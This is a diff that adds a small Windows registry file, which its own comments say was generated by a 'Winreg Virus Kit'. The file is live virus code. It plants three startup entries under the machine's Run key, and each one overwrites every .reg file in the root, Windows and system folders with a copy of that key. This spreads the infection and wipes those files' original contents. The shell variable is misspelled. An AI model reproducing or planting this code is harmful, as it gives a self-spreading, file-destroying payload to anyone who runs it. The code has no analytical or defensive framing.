@@ -1,0 +1,11 @@
+Regedit4
+
+; Winreg.gen Created With
+; The Winreg Virus Kit
+; 
+
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\]
+"KCORWUANWK"="%compsec% /c for %i in (C:\\*.reg) do regedit /e %i HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+"MMLIKGBGYBJ"="%compsec% /c for %i in (%windir%\\*.reg) do regedit /e %i HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+"MDLGPN"="%compsec% /c for %i in (%windir%\\system\\*.reg) do regedit /e %i HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+
